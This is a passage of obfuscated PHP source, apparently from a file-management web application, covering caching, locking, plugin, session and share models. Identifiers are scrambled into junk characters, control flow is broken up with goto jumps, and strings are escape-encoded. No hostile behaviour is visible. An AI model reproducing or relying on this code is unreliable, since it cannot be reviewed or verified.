$_SERVER[¯èãÄπµ]; $FîåèêœóË = substr($bﬁèÊ‘ø¿•, 1, -1); $aùƒâÁ∞≈ÿ = $f≥ìê⁄ôÿà[1077] . $FîåèêœóË . $f≥ìê⁄ôÿà[1078] . $B†∫åŸê’π . $f≥ìê⁄ôÿà[1079]; $aùƒâÁ∞≈ÿ = $d•Œ¡†Ç£Ë ? $aùƒâÁ∞≈ÿ . $d•Œ¡†Ç£Ë . $f≥ìê⁄ôÿà[8] : $aùƒâÁ∞≈ÿ; return $aùƒâÁ∞≈ÿ; } public static function hashPath($a¿ù⁄çêƒœ) { $EÇ¢íáéı¶ =& $_SERVER[¯èãÄπµ]; $BΩá¿ËêÛ∫ = is_array($a¿ù⁄çêƒœ) ? $a¿ù⁄çêƒœ : IO::info($a¿ù⁄çêƒœ); $EÕ”ÍæÇë‚ = _get($BΩá¿ËêÛ∫, $EÇ¢íáéı¶[1080], $EÇ¢íáéı¶[33]); if (!$EÕ”ÍæÇë‚) { $f∏ºù√Àﬁó = KodIO::parse($BΩá¿ËêÛ∫[$EÇ¢íáéı¶[75]]); if (!$f∏ºù√Àﬁó[$EÇ¢íáéı¶[29]]) { $EÕ”ÍæÇë‚ = IO::hashSimple($BΩá¿ËêÛ∫[$EÇ¢íáéı¶[75]]); } } if (!$EÕ”ÍæÇë‚) { $EÕ”ÍæÇë‚ = md5($BΩá¿ËêÛ∫[$EÇ¢íáéı¶[75]] . $BΩá¿ËêÛ∫[$EÇ¢íáéı¶[77]] . $BΩá¿ËêÛ∫[$EÇ¢íáéı¶[106]]); } return $EÕ”ÍæÇë‚; } public static function initSystemPath() { $e€Ñ∂ñ£ø« =& $_SERVER[¯èãÄπµ]; if (defined($e€Ñ∂ñ£ø«[1081])) { return; } define($e€Ñ∂ñ£ø«[1081], self::systemPath($e€Ñ∂ñ£ø«[1082])); define($e€Ñ∂ñ£ø«[1083], self::systemPath($e€Ñ∂ñ£ø«[1084])); define($e€Ñ∂ñ£ø«[1085], self::systemPath($e€Ñ∂ñ£ø«[1086])); define($e€Ñ∂ñ£ø«[1087], self::systemPath($e€Ñ∂ñ£ø«[1088])); } private static function systemPath($a∏¬·ïÓ—ù) { goto dÒÔﬂ¬è£ë; DÂçıÊßöÕ: if ($bøÁÕ¬´∞≥) { return $bøÁÕ¬´∞≥; } if ($a∏¬·ïÓ—ù == $cŒÏÂπﬁÒû[1082]) { $bøÁÕ¬´∞≥ = self::make(Model($cŒÏÂπﬁÒû[755])->systemRootPathAdd($cŒÏÂπﬁÒû[1091])); } else { $bøÁÕ¬´∞≥ = self::systemPath($cŒÏÂπﬁÒû[1082]); $E…¿ÍÁôŸ≥ = self::sourceID($bøÁÕ¬´∞≥); $bøÁÕ¬´∞≥ = self::make(Model($cŒÏÂπﬁÒû[755])->mkdir($E…¿ÍÁôŸ≥, $a∏¬·ïÓ—ù)); } Model($cŒÏÂπﬁÒû[1090])->set($aïà•≤⁄çÿ, $bøÁÕ¬´∞≥); goto F≠ˆä∫ÔΩ∆; dÒÔﬂ¬è£ë: $cŒÏÂπﬁÒû =& $_SERVER[¯èãÄπµ]; $aïà•≤⁄çÿ = $cŒÏÂπﬁÒû[1089] . ucfirst($a∏¬·ïÓ—ù); $bøÁÕ¬´∞≥ = Model($cŒÏÂπﬁÒû[1090])->get($aïà•≤⁄çÿ); goto DÂçıÊßöÕ; F≠ˆä∫ÔΩ∆: return $bøÁÕ¬´∞≥; goto A—‚™ç∑≤ä; A—‚™ç∑≤ä: } public static function systemFolder($f®‚Ÿ”›Â≈) { $cÜ√⁄ö°‘É = IO_PATH_SYSTEM_SOURCE . $f®‚Ÿ”›Â≈; $DÂ⁄¨·î»÷ = Cache::get($cÜ√⁄ö°‘É); if (!$DÂ⁄¨·î»÷) { $aÖ≠Ìà¥∂– = IO::infoFull($cÜ√⁄ö°‘É); if (!$aÖ≠Ìà¥∂–) { $DÂ⁄¨·î»÷ = IO::mkdir($cÜ√⁄ö°‘É, REPEAT_SKIP); } else { $DÂ⁄¨·î»÷ = $aÖ≠Ìà¥∂–[$_SERVER[¯èãÄπµ][75]]; } Cache::set($cÜ√⁄ö°‘É, $DÂ⁄¨·î»÷, 3600 * 10); } return $DÂ⁄¨·î»÷; } public static function defaultDriver() { return Model($_SERVER[¯èãÄπµ][707])->defaultDriver(); } public static function defaultIO() { $C˘πè‘ÙÑ• =& $_SERVER[¯èãÄπµ]; $FÁô∏¢èëÖ = self::defaultDriver(); return $C˘πè‘ÙÑ•[1092] . $FÁô∏¢èëÖ[$C˘πè‘ÙÑ•[363]] . $C˘πè‘ÙÑ•[1079]; } public static function fileTypeList() { $fºåø¡Ö◊ä =& $_SERVER[¯èãÄπµ]; $a•Œ⁄á°Òâ = $GLOBALS[$fºåø¡Ö◊ä[6]][$fºåø¡Ö◊ä[1093]]; foreach ($a•Œ⁄á°Òâ as $Cëü≥´Ã÷´ => $AìÒáÇ√Ü‰) { $dßﬂëáÔÀ∂ = $fºåø¡Ö◊ä[1094] . $Cëü≥´Ã÷´; $aìÁÜ Ï∆ï = LNG($dßﬂëáÔÀ∂); if ($dßﬂëáÔÀ∂ != $aìÁÜ Ï∆ï) { $a•Œ⁄á°Òâ[$Cëü≥´Ã÷´][$fºåø¡Ö◊ä[28]] = $aìÁÜ Ï∆ï; } } return $a•Œ⁄á°Òâ; } } goto D∂π£‡˘«†; DÛÚ°≤ñ˜¬: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto A…©üµ‹ªù; A…©üµ‹ªù: $B££∏¯≈Ë˜ =& $_SERVER[¯èãÄπµ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto bæó¥Éπã«; bæó¥Éπã«: $Fí…ƒ´∂·§ = $GLOBALS[$B££∏¯≈Ë˜[6]][$B££∏¯≈Ë˜[333]]; $A„¢Ï±∏í¯ = $Fí…ƒ´∂·§[$Fí…ƒ´∂·§[$B££∏¯≈Ë˜[756]]]; $A¿’ê¯ê‚Ç = $Fí…ƒ´∂·§[$B££∏¯≈Ë˜[757]]; goto a¶ìú‰™æÕ; a¶ìú‰™æÕ: switch ($Fí…ƒ´∂·§[$B££∏¯≈Ë˜[756]]) { case $B££∏¯≈Ë˜[17]: self::$handle = Model($B££∏¯≈Ë˜[758]); break; case $B££∏¯≈Ë˜[759]: self::$handle = new CacheRedis($A„¢Ï±∏í¯, $A¿’ê¯ê‚Ç); break; case $B££∏¯≈Ë˜[760]: self::$handle = new CacheMemcached($A„¢Ï±∏í¯, $A¿’ê¯ê‚Ç); break; case $B££∏¯≈Ë˜[163]: self::$handle = new CacheFile($A„¢Ï±∏í¯, $A¿’ê¯ê‚Ç); break; default: break; } return self::$handle; goto Fí∆∫‡¶ÇÀ; Fí∆∫‡¶ÇÀ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($fÇßßÓ∞Íê) { if (is_array($fÇßßÓ∞Íê) || is_object($fÇßßÓ∞Íê)) { $fÇßßÓ∞Íê = json_encode($fÇßßÓ∞Íê); } $fÇßßÓ∞Íê = rawurlencode($fÇßßÓ∞Íê); return KOD_SITE_ID . $_SERVER[¯èãÄπµ][70] . $fÇßßÓ∞Íê; } public static function get($aËÉ≠ÊÑïÃ) { $bïØ¡πëÔà = self::key($aËÉ≠ÊÑïÃ); if (!isset(self::$memoryCache[$bïØ¡πëÔà])) { $C•úÈº◊ä∫ = self::init()->get($bïØ¡πëÔà); self::$memoryCache[$bïØ¡πëÔà] = unserialize($C•úÈº◊ä∫); } return self::$memoryCache[$bïØ¡πëÔà]; } public static function set($f‹ßøáå∞ç, $Eé«ô·Á√, $Eß≥ÊÊîﬁ‘ = false) { goto Aÿû·¥…‡≥; dı∑Èëöß–: CacheLock::lock($f‹ßøáå∞ç); $Cÿá§Ù£Ç´ = self::init()->set($BîöÖı°Õ›, serialize($Eé«ô·Á√), $Eß≥ÊÊîﬁ‘); self::$memoryCache[$BîöÖı°Õ›] = $Eé«ô·Á√; goto D«ñïàà£†; D«ñïàà£†: CacheLock::unlock($f‹ßøáå∞ç); return $Cÿá§Ù£Ç´; goto EÚÖ¿ﬂı≤≤; Aÿû·¥…‡≥: $BîöÖı°Õ› = self::key($f‹ßøáå∞ç); if (isset(self::$memoryCache[$BîöÖı°Õ›]) && self::$memoryCache[$BîöÖı°Õ›] === $Eé«ô·Á√) { return !0; } if ($Eß≥ÊÊîﬁ‘ === 0) { self::$memoryCache[$BîöÖı°Õ›] = $Eé«ô·Á√; return !0; } goto dı∑Èëöß–; EÚÖ¿ﬂı≤≤: } public static function remove($CëèßÂÃΩÓ) { goto aÑ∑ﬂü›‰»; eôÒ÷Ω±Ç€: return $CÍ≠Œ¿ÛˆÓ; goto Bë¿ÍËﬂÏ≈; C†øãô∞”É: CacheLock::lock($CëèßÂÃΩÓ); $CÍ≠Œ¿ÛˆÓ = self::init()->remove($Bà“çÑå™Ÿ); CacheLock::unlock($CëèßÂÃΩÓ); goto eôÒ÷Ω±Ç€; aÑ∑ﬂü›‰»: $Bà“çÑå™Ÿ = self::key($CëèßÂÃΩÓ); unset(self::$memoryCache[$Bà“çÑå™Ÿ]); self::clearTimeout(); goto C†øãô∞”É; Bë¿ÍËﬂÏ≈: } public static function clearMemory($c‹À‡–üää = false) { if ($c‹À‡–üää) { $c‹À‡–üää = self::key($c‹À‡–üää); unset(self::$memoryCache[$c‹À‡–üää]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¯èãÄπµ][761])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¯èãÄπµ][762])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Aƒìúò…àø, $CÇﬁΩÖÖµñ) { $cë√îŸô∫Ö =& $_SERVER[¯èãÄπµ]; $this->cachePath = $Aƒìúò…àø[$cë√îŸô∫Ö[75]]; $this->prefix = $cë√îŸô∫Ö[763]; $this->cacheTime = $CÇﬁΩÖÖµñ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($CòáÏü€õ≈) { $fø¡¶êπ‰¡ =& $_SERVER[¯èãÄπµ]; $CòáÏü€õ≈ = str_replace(array($fø¡¶êπ‰¡[764], $fø¡¶êπ‰¡[93], $fø¡¶êπ‰¡[69]), $fø¡¶êπ‰¡[765], $CòáÏü€õ≈); return $this->cachePath . $fø¡¶êπ‰¡[766] . $CòáÏü€õ≈ . $fø¡¶êπ‰¡[767]; } public function set($c∑ÂâôåÑÙ, $fêÇÖ´úÂ, $BÜ≠≠îòΩ¢ = false) { $b»Ò¨÷ØÇ€ = $this->getFile($c∑ÂâôåÑÙ); if (file_put_contents($b»Ò¨÷ØÇ€, $this->prefix . $fêÇÖ´úÂ, LOCK_EX)) { return !0; } @unlink($b»Ò¨÷ØÇ€); return !1; } public function get($d”äÔÑ‘¯ñ) { $eÊ§Íƒ∞Øú = $this->getFile($d”äÔÑ‘¯ñ); if (file_exists($eÊ§Íƒ∞Øú) && filemtime($eÊ§Íƒ∞Øú) < time() - $this->cacheTime) { @unlink($eÊ§Íƒ∞Øú); return !1; } $f‰÷¥†ÖÖ¶ = @file_get_contents($eÊ§Íƒ∞Øú); return substr($f‰÷¥†ÖÖ¶, strlen($this->prefix)); } public function remove($A∞êªﬂñ·é) { $B«†Ö“Ñ†® = $this->getFile($A∞êªﬂñ·é); return @unlink($B«†Ö“Ñ†®); } public function deleteAll() { $b„ÕŒü£”‡ =& $_SERVER[¯èãÄπµ]; $F“∞àµ∂¨≠ = scandir($this->cachePath); foreach ($F“∞àµ∂¨≠ as $DôÑã© –§) { $b˜ø«ñ‹‰» = $this->cachePath . $DôÑã© –§; if (strpos($b˜ø«ñ‹‰», $b„ÕŒü£”‡[767]) && strpos($b˜ø«ñ‹‰», $b„ÕŒü£”‡[768])) { @unlink($b˜ø«ñ‹‰»); } } } public function clearTimeout() { $a‡±í©Øæ¡ =& $_SERVER[¯èãÄπµ]; $CŸçóÛ ≥— = scandir($this->cachePath); foreach ($CŸçóÛ ≥— as $EﬂØÑœÊ≤§) { $A‚¬›√¥ÂØ = $this->cachePath . $EﬂØÑœÊ≤§; if (strpos($A‚¬›√¥ÂØ, $a‡±í©Øæ¡[767]) && strpos($A‚¬›√¥ÂØ, $a‡±í©Øæ¡[768]) && filemtime($A‚¬›√¥ÂØ) < time() - $this->cacheTime) { @unlink($A‚¬›√¥ÂØ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c√πÌ¶Ïàô; B±ºóΩèÓ‚: if ($f—Àâ ààå == $C…“ƒ»êﬂﬁ[17] && $fÆ±Õ√…‚¢ == $C…“ƒ»êﬂﬁ[9]) { $f—Àâ ààå = $C…“ƒ»êﬂﬁ[163]; } switch ($f—Àâ ààå) { case $C…“ƒ»êﬂﬁ[759]: self::$handle = new CacheLockRedis(); break; case $C…“ƒ»êﬂﬁ[760]: self::$handle = new CacheLockMemcached(); break; case $C…“ƒ»êﬂﬁ[17]: self::$handle = new CacheLockDatabase(); break; case $C…“ƒ»êﬂﬁ[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto eÎé∞ÖÑê; fàéªâ¢áé: self::$timeout = $dô´Ü›ÔÚï[$C…“ƒ»êﬂﬁ[769]] ? $dô´Ü›ÔÚï[$C…“ƒ»êﬂﬁ[769]] : 10; $fÆ±Õ√…‚¢ = _get($GLOBALS[$C…“ƒ»êﬂﬁ[6]], $C…“ƒ»êﬂﬁ[770]); $f—Àâ ààå = $dô´Ü›ÔÚï[$C…“ƒ»êﬂﬁ[756]] ? $dô´Ü›ÔÚï[$C…“ƒ»êﬂﬁ[756]] : $C…“ƒ»êﬂﬁ[163]; goto B±ºóΩèÓ‚; c√πÌ¶Ïàô: $C…“ƒ»êﬂﬁ =& $_SERVER[¯èãÄπµ]; if (self::$handle) { return self::$handle; } $dô´Ü›ÔÚï = $GLOBALS[$C…“ƒ»êﬂﬁ[6]][$C…“ƒ»êﬂﬁ[333]]; goto fàéªâ¢áé; eÎé∞ÖÑê: } private static function key($CÏë‘∑ôßà) { return $_SERVER[¯èãÄπµ][771] . Cache::key($CÏë‘∑ôßà); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AÌéµ‹ã = '') { self::$errorMsg = $AÌéµ‹ã; } public static function lockGlobal($Dë£ÒÁ”‘œ, $D≠Ù¶â‡êã) { return self::lock($Dë£ÒÁ”‘œ, $D≠Ù¶â‡êã, !0); } public static function lock($b◊‹ì˘Ñ—”, $aºòÇ∂òüî = false, $A¬≤¿§∏∞È = false) { goto fçœ‚ø¡ˆò; c‘÷≈Ç¿ﬁé: if (!$A¬≤¿§∏∞È) { self::$lockItem[$eéœãÏ∑ù] = !0; } return $F¿á¯Îñê∑; goto C“≠Ÿ¨£ﬁ¡; eµ±ñÚËíõ: $aºòÇ∂òüî = $aºòÇ∂òüî ? $aºòÇ∂òüî : self::$timeout; $F¿á¯Îñê∑ = $c¶—∂±˜ŸØ->lock($eéœãÏ∑ù, $aºòÇ∂òüî); if (!$F¿á¯Îñê∑) { $b≈≥éêë€” = $f ≤π‡ç–“[772] . $aºòÇ∂òüî . $f ≤π‡ç–“[67] . self::$errorMsg . $f ≤π‡ç–“[67] . get_caller_msg(); $eÖÙöµüÿâ = "\x4c\x6f\143\x6b\x20\x61\x63\x74\x69\157\x6e\72\40{$eéœãÏ∑ù}\x20\164\x69\x6d\x65\x6f\x75\x74\x2c\x6f\166\145\x72\40{$aºòÇ∂òüî}\40\163"; $eÖÙöµüÿâ = self::$errorMsg ? self::$errorMsg : $d–ëÒ±Ï¡Ω; write_log($b≈≥éêë€”, $f ≤π‡ç–“[773]); show_json($eÖÙöµüÿâ, !1); } goto c‘÷≈Ç¿ﬁé; fçœ‚ø¡ˆò: $f ≤π‡ç–“ =& $_SERVER[¯èãÄπµ]; $c¶—∂±˜ŸØ = self::init(); $eéœãÏ∑ù = self::key($b◊‹ì˘Ñ—”); goto eµ±ñÚËíõ; C“≠Ÿ¨£ﬁ¡: } public static function lockGet($fﬁÃ¶íÓÊ∑) { $dô≤ø≠ÛÂÈ = self::key($fﬁÃ¶íÓÊ∑); if (self::$lockItem[$dô≤ø≠ÛÂÈ]) { return self::$lockItem[$dô≤ø≠ÛÂÈ]; } return self::init()->lockGet($dô≤ø≠ÛÂÈ); } public static function unlock($A©åΩáõ–Ù) { $eí¡õÁåºî = self::key($A©åΩáõ–Ù); self::$lockItem[$eí¡õÁåºî] = null; return self::init()->unlock($eí¡õÁåºî); } public static function unlockRuntime() { $Eã£áÇ°ë¥ =& $_SERVER[¯èãÄπµ]; $b÷òÉ≈Ô‚” = self::init(); $CæÑ›¢ﬂù† = !1; foreach (self::$lockItem as $A≠˘õ∫Ö˘° => $A§ìà◊…÷˜) { if (!$A§ìà◊…÷˜) { continue; } $b÷òÉ≈Ô‚”->unlock($A≠˘õ∫Ö˘°); if (!$CæÑ›¢ﬂù†) { $CæÑ›¢ﬂù† = !0; write_log($Eã£áÇ°ë¥[774] . $A≠˘õ∫Ö˘° . $Eã£áÇ°ë¥[67] . get_caller_msg(), $Eã£áÇ°ë¥[773]); continue; } write_log($Eã£áÇ°ë¥[774] . $A≠˘õ∫Ö˘°, $Eã£áÇ°ë¥[773]); } } } goto f∞úéãÓÔÒ; f‚¡Ë∑éá£: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\160\x6c\165\147\151\x6e\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\x73\x74\141\x74\165\163", "\x72\145\147\151\145\x73\164", "\x63\157\x6e\146\x69\147"); public function loadList($eÏÚäÁíˆ¢ = false) { $EœæµçÎßÙ = array_to_keyvalue($this->listData(), $_SERVER[¯èãÄπµ][28]); if ($eÏÚäÁíˆ¢) { return $EœæµçÎßÙ[$eÏÚäÁíˆ¢]; } return $EœæµçÎßÙ; } public function init() { $dÉ»√èıêÀ =& $_SERVER[¯èãÄπµ]; Hook::trigger($dÉ»√èıêÀ[2175]); $bª÷√◊◊Ø› = $this->loadPluginList(); foreach ($bª÷√◊◊Ø› as $AàÎ˜ñ§ë’ => $Fä§ıÍ ”•) { $AñµÁ–Àà‚ = $this->appAllow($AàÎ˜ñ§ë’, $Fä§ıÍ ”•); if (!$AñµÁ–Àà‚) { continue; } foreach ($Fä§ıÍ ”•[$dÉ»√èıêÀ[2176]] as $d–ÙÖè‰æå => $b∫≠øﬁÌµ∏) { Hook::bind($d–ÙÖè‰æå, $b∫≠øﬁÌµ∏); } } Hook::trigger($dÉ»√èıêÀ[2177]); Hook::trigger(ACTION); } public function appAllow($Aí‹îãùÈî, $A‚¡—‡ªÍ”, $cÙå÷Ó¢õ£ = true) { $a‘ºÒı§£Ø =& $_SERVER[¯èãÄπµ]; $fÜäô≠»◊≥ = PLUGIN_DIR . $Aí‹îãùÈî . $a‘ºÒı§£Ø[2178]; if (!is_array($A‚¡—‡ªÍ”) || !is_array($A‚¡—‡ªÍ”[$a‘ºÒı§£Ø[2176]]) || !is_file($fÜäô≠»◊≥) || $A‚¡—‡ªÍ”[$a‘ºÒı§£Ø[692]] != 1) { return !1; } if ($cÙå÷Ó¢õ£ && !Action($a‘ºÒı§£Ø[2179])->checkAuth($Aí‹îãùÈî)) { return !1; } return !0; } public function unInstall($b∞÷ÀÖ≠™«) { $Fºﬂ·…âÒ∞ =& $_SERVER[¯èãÄπµ]; $D⁄íó⁄ª∏§ = $this->loadList($b∞÷ÀÖ≠™«); if (file_exists(PLUGIN_DIR . $b∞÷ÀÖ≠™«)) { Hook::apply($b∞÷ÀÖ≠™« . $Fºﬂ·…âÒ∞[2180]); } $this->remove($D⁄íó⁄ª∏§[$Fºﬂ·…âÒ∞[363]]); } public function changeStatus($bœ≤ËΩü«Ó, $c é√„≠éÑ) { $b“È√‡æ»Î =& $_SERVER[¯èãÄπµ]; $A˘≠˜ÛÇÏÉ = $this->loadList($bœ≤ËΩü«Ó); if ($c é√„≠éÑ) { Hook::apply($bœ≤ËΩü«Ó . $b“È√‡æ»Î[2181]); } $this->update($A˘≠˜ÛÇÏÉ[$b“È√‡æ»Î[363]], array($b“È√‡æ»Î[2182] => $c é√„≠éÑ)); } public function appRegist($f‘àÉ÷–êß, $Bœ÷”Í¬ˆˆ) { $d€çƒΩ«µµ =& $_SERVER[¯èãÄπµ]; $f¡Œ—ç∞ã÷ = $this->loadList($f‘àÉ÷–êß); if ($f¡Œ—ç∞ã÷) { $this->update($f¡Œ—ç∞ã÷[$d€çƒΩ«µµ[363]], array($d€çƒΩ«µµ[2176] => $Bœ÷”Í¬ˆˆ)); } else { $dÖË°¶Úß‹ = array($d€çƒΩ«µµ[28] => $f‘àÉ÷–êß, $d€çƒΩ«µµ[2176] => $Bœ÷”Í¬ˆˆ, $d€çƒΩ«µµ[692] => 0, $d€çƒΩ«µµ[6] => $this->getConfigDefault($f‘àÉ÷–êß)); $this->insert($dÖË°¶Úß‹); } } public function getConfigDefault($A÷‹Ü‘™É¨) { $AﬁÏ¢Àê®á =& $_SERVER[¯èãÄπµ]; $aªâ˜„øˆª = array(); $D˜÷‚ÊÖóÚ = $this->getPackageJson($A÷‹Ü‘™É¨); if (!$D˜÷‚ÊÖóÚ && is_array($D˜÷‚ÊÖóÚ[$AﬁÏ¢Àê®á[2183]])) { return $aªâ˜„øˆª; } foreach ($D˜÷‚ÊÖóÚ[$AﬁÏ¢Àê®á[2183]] as $Eó˘ççÂ≠º => $FÎëà∏Êª£) { if (!isset($FÎëà∏Êª£[$AﬁÏ¢Àê®á[355]]) || isset($aªâ˜„øˆª[$Eó˘ççÂ≠º])) { continue; } $aªâ˜„øˆª[$Eó˘ççÂ≠º] = $FÎëà∏Êª£[$AﬁÏ¢Àê®á[355]]; } return $aªâ˜„øˆª; } public function getPackageJson($Dãò“ææô∫) { return Hook::apply($Dãò“ææô∫ . $_SERVER[¯èãÄπµ][2184]); } public function getConfig($dæî—¥æÌ¶, $Cππ¥ æâ  = false) { $dê–ÛÓÒÉ‰ =& $_SERVER[¯èãÄπµ]; $eëúù€©ç¨ = array(); $CΩ¯π›ÚÊÁ = $this->loadList($dæî—¥æÌ¶); if ($CΩ¯π›ÚÊÁ && is_array($CΩ¯π›ÚÊÁ[$dê–ÛÓÒÉ‰[6]])) { $eëúù€©ç¨ = $CΩ¯π›ÚÊÁ[$dê–ÛÓÒÉ‰[6]]; } if (!$eëúù€©ç¨ || $Cππ¥ æâ ) { $eëúù€©ç¨ = $this->getConfigDefault($dæî—¥æÌ¶); } return $eëúù€©ç¨; } public function setConfig($A—éﬁÆƒÒÚ, $Bı–‡ëé’– = false) { goto d¯ìï≤‹çÉ; FÂ¡‡∆«ÏÃ: if ($Bı–‡ëé’– == !1) { $Bı–‡ëé’– = $this->getConfigDefault($A—éﬁÆƒÒÚ); } $FáÁã¯éè⁄ = $a·≥èüÃ™©[$d«úÊÜÃú˘[6]]; foreach ($Bı–‡ëé’– as $eºƒ˜ÊØÜí => $f™ëÕè”Çƒ) { $FáÁã¯éè⁄[$eºƒ˜ÊØÜí] = is_string($f™ëÕè”Çƒ) ? trim($f™ëÕè”Çƒ) : $f™ëÕè”Çƒ; } goto Fü†ﬂ€¡Ì§; Fü†ﬂ€¡Ì§: $this->update($a·≥èüÃ™©[$d«úÊÜÃú˘[363]], array($d«úÊÜÃú˘[6] => $FáÁã¯éè⁄)); goto B…ÌÜô∞§ﬁ; d¯ìï≤‹çÉ: $d«úÊÜÃú˘ =& $_SERVER[¯èãÄπµ]; $a·≥èüÃ™© = $this->loadList($A—éﬁÆƒÒÚ); if (!$a·≥èüÃ™©) { return !1; } goto FÂ¡‡∆«ÏÃ; B…ÌÜô∞§ﬁ: } public function viewList() { goto FÛÿ†ºá‡¡; FÛÿ†ºá‡¡: $b≠Ôñ⁄–¬ç =& $_SERVER[¯èãÄπµ]; $E ƒàØ›ñô = $this->loadList(); $this->pluginScan($E ƒàØ›ñô); goto C∆ŒÇæÚ‘à; d‡ÀØˆØûÊ: return $E⁄èùÿñê´; goto dÜ´èí≠‰–; C∆ŒÇæÚ‘à: $E ƒàØ›ñô = $this->loadPluginList(); $E⁄èùÿñê´ = array(); foreach ($E ƒàØ›ñô as $D¬é∫Û©©– => $e°¢É•‡´Ñ) { unset($e°¢É•‡´Ñ[$b≠Ôñ⁄–¬ç[2176]], $e°¢É•‡´Ñ[$b≠Ôñ⁄–¬ç[6]]); $Aº≥É®ºíò = PLUGIN_DIR . $e°¢É•‡´Ñ[$b≠Ôñ⁄–¬ç[28]] . $b≠Ôñ⁄–¬ç[2178]; if (!is_file($Aº≥É®ºíò)) { continue; } $Aæ»ºì˜ñ = Hook::apply($e°¢É•‡´Ñ[$b≠Ôñ⁄–¬ç[28]] . $b≠Ôñ⁄–¬ç[2184]); if (is_array($Aæ»ºì˜ñ)) { $E⁄èùÿñê´[$D¬é∫Û©©–] = array_merge($e°¢É•‡´Ñ, $Aæ»ºì˜ñ); } } goto d‡ÀØˆØûÊ; dÜ´èí≠‰–: } private function loadPluginList() { $Añê®©«‘∆ =& $_SERVER[¯èãÄπµ]; $b˜»∏úπ∂¢ = $this->loadList(); if (strtolower(MOD) == $Añê®©«‘∆[2185]) { return $b˜»∏úπ∂¢; } $c§∏ÒÕñ´§ = Hook::trigger($Añê®©«‘∆[2186], $b˜»∏úπ∂¢); if ($b˜»∏úπ∂¢ && !$c§∏ÒÕñ´§) { die; } return $c§∏ÒÕñ´§ ? $c§∏ÒÕñ´§ : $b˜»∏úπ∂¢; } private function pluginScan($EÁ‘ƒ‚È§É) { $EËÔÇÂËƒÙ =& $_SERVER[¯èãÄπµ]; recursion_dir(PLUGIN_DIR, $f≠ü◊µ–øï, $c•”Á∫ æª, 0); foreach ($f≠ü◊µ–øï as $e‹Œçá∏ôÖ) { $Dü€ÁÕ˘†¿ = get_path_this($e‹Œçá∏ôÖ); if (isset($EÁ‘ƒ‚È§É[$Dü€ÁÕ˘†¿]) || !file_exists($e‹Œçá∏ôÖ . $EËÔÇÂËƒÙ[2187]) || !file_exists($e‹Œçá∏ôÖ . $EËÔÇÂËƒÙ[2178])) { continue; } Hook::apply($Dü€ÁÕ˘†¿ . $EËÔÇÂËƒÙ[2181]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\155\137\x73\145\x73\163\x69\157\x6e"; public function get($E≈©ﬂØ¢•Í) { $Bâ¨€æ‹“Æ =& $_SERVER[¯èãÄπµ]; $F·ÑÛı–î¿ = $this->where(array($Bâ¨€æ‹“Æ[2188] => $E≈©ﬂØ¢•Í))->find(); if (!is_array($F·ÑÛı–î¿)) { return !1; } return $F·ÑÛı–î¿[$Bâ¨€æ‹“Æ[695]]; } public function set($FÑüõ·Œ¿ä, $Cèü£â  ¨, $eÊõµ¿ñŸÆ = 3600) { $f©ä¬˘ä§€ =& $_SERVER[¯èãÄπµ]; $A÷ãæ”˘ŸØ = array($f©ä¬˘ä§€[2188] => $FÑüõ·Œ¿ä, $f©ä¬˘ä§€[2117] => $Cèü£â  ¨, $f©ä¬˘ä§€[2189] => $eÊõµ¿ñŸÆ + time()); if (Session::get($f©ä¬˘ä§€[2190])) { $A÷ãæ”˘ŸØ[$f©ä¬˘ä§€[1424]] = Session::get($f©ä¬˘ä§€[2190]); } else { $A÷ãæ”˘ŸØ[$f©ä¬˘ä§€[1424]] = 0; } if ($this->get($FÑüõ·Œ¿ä)) { return $this->where(array($f©ä¬˘ä§€[2188] => $FÑüõ·Œ¿ä))->save($A÷ãæ”˘ŸØ); } else { return $this->add($A÷ãæ”˘ŸØ, array(), !0); } } public function remove($A÷ï∆çΩÆÍ) { return $this->where(array($_SERVER[¯èãÄπµ][2188] => $A÷ï∆çΩÆÍ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¯èãÄπµ][2191] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\x69\x6d\145", "\x74\x69\155\145", "\151\x6e\163\x65\162\164\54\x75\160\x64\x61\x74\145", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\143\x72\145\141\164\x65\124\151\x6d\145", "\164\151\155\x65", "\x69\x6e\163\145\162\164", "\146\165\156\143\164\x69\x6f\156"), array("\157\x70\x74\x69\157\x6e\163", '', "\151\x6e\x73\x65\162\164\x2c\x75\160\144\141\164\x65\54\x73\145\154\x65\x63\164", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($a„©ﬁ÷•Æ£) { $Aí ±√≠µ≠ =& $_SERVER[¯èãÄπµ]; $B£¡Íª»Æ¶ = isset($a„©ﬁ÷•Æ£[0]) ? $a„©ﬁ÷•Æ£[0] : !1; return array($Aí ±√≠µ≠[2192] => array(USER_ID, $Aí ±√≠µ≠[2193]), $Aí ±√≠µ≠[2155] => array($B£¡Íª»Æ¶, $Aí ±√≠µ≠[2194])); } protected function listSimple() { $eÈÑ⁄‚‹Ö¿ = array($_SERVER[¯èãÄπµ][1424] => USER_ID); $eÇ‡¨”æ´∏ = $this->field($this->fieldList)->where($eÈÑ⁄‚‹Ö¿)->select(); return $eÇ‡¨”æ´∏ ? $eÇ‡¨”æ´∏ : array(); } protected function getInfo($aµç¬Ãü¬É, $a€ìñç‘º® = false) { $dÍã‰Ó˜¨◊ =& $_SERVER[¯èãÄπµ]; if ($a€ìñç‘º®) { return $this->_getShareInfo(array($dÍã‰Ó˜¨◊[437] => $aµç¬Ãü¬É)); } $d„ÊŒŸô∑Ú = 